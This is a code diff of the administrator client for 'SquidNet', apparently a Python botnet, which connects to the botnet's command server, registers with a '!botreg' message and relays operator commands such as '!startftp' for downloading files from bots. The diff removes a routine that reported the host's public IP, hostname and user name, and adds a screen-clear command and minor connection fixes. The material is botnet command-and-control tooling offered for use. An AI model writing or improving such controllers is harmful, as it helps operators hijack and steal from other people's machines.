@@ -90,18 +90,7 @@ Admin Script For SquidNet by DrSquid
         db.commit()
         cursor.close()
         db.commit()
-    def get_ip(self):
-        try:
-            return urllib.request.urlopen(urllib.request.Request(url="https://httpbin.org/ip")).read().decode().strip().split('"')[3]
-        except:
-            try:
-                return socket.gethostbyname(socket.gethostname())
-            except:
-                return "127.0.0.1"
-    def get_info(self):
-        return f"!botreg {socket.gethostname()} {self.get_ip()} {os.getlogin()} {sys.platform}".encode()
     def connect(self):
-        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         success = False
         while not success:
             conn_method = input("[+] Are you connecting to a new server or one you've connected to?(new/old): ")
@@ -110,16 +99,17 @@ Admin Script For SquidNet by DrSquid
                     try:
                         self.ip = input("[+] Enter the IP of the SquidNet Server: ")
                         self.port = int(input("[+] Enter the port of the SquidNet Server: "))
+                        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         self.client.connect((self.ip, self.port))
                         version = self.client.recv(1024).decode()
-                        self.client.send(self.get_info())
+                        self.client.send(f"!botreg UNKNOWN 127.0.0.1 Admin SquidNet".encode())
                         self.exec_sql_cmd(f"insert into servers values('{self.ip}','{self.port}')")
                         print("[+] Successfully connected to the server!")
                         print(f"[+] Server Banner: {version}")
                         success = True
                         break
                     except socket.error as e:
-                        print("[+] There was an error with connecting you to the SquidNet Server. Input 'cancel' as your ip to revert back to the first input.")
+                        print(f"[+] There was an error with connecting you to the SquidNet Server({e}). Input 'cancel' as your ip to revert back to the first input.")
                     except:
                         if self.ip == "cancel":
                             break
@@ -143,9 +133,10 @@ Admin Script For SquidNet by DrSquid
                                 server = servers[server]
                                 self.ip = server.split(":")[0]
                                 self.port = int(server.split(":")[1])
+                                self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                 self.client.connect((self.ip, self.port))
                                 version = self.client.recv(1024).decode()
-                                self.client.send(self.get_info())
+                                self.client.send(f"!botreg UNKNOWN 127.0.0.1 Admin SquidNet".encode())
                                 print("[+] Successfully connected to the server!")
                                 print(f"[+] Server Banner: {version}")
                                 success = True
@@ -198,7 +189,14 @@ Admin Script For SquidNet by DrSquid
                 if logged_in:
                     msg = input("[+] Enter your msg: ")
                     if not self.downloading_file:
-                        self.client.send(msg.encode())
+                        if msg == "!clear":
+                            if sys.platform == "win32":
+                                os.system("cls")
+                            else:
+                                os.system("clear")
+                            print(self.logo())
+                        else:
+                            self.client.send(msg.encode())
                     else:
                         print("[(SERVER)]: You are not able to send messages to the server until you have finished downloading the files!")
                     if msg == "!startftp":
